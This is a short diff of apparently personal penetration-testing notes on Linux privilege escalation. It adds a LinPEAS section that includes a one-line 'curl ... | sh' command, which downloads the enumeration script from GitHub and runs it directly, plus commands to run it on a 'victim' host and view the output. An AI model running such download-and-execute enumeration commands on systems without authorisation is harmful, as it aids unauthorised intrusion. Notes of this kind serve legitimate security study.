@@ -6,8 +6,17 @@ vertical privesc
 
 https://book.hacktricks.xyz/linux-unix/privilege-escalation  (carlosmpolopm)
 
-linenum
+Linpeas
+# From github
 
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+# Output to file
+
+./linpeas.sh -a /tmp/linpeas.txt #Victim
+less -r /linpeas.txt #Read with colors
+
+linenum
 https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh
 
 two ways of uploading:
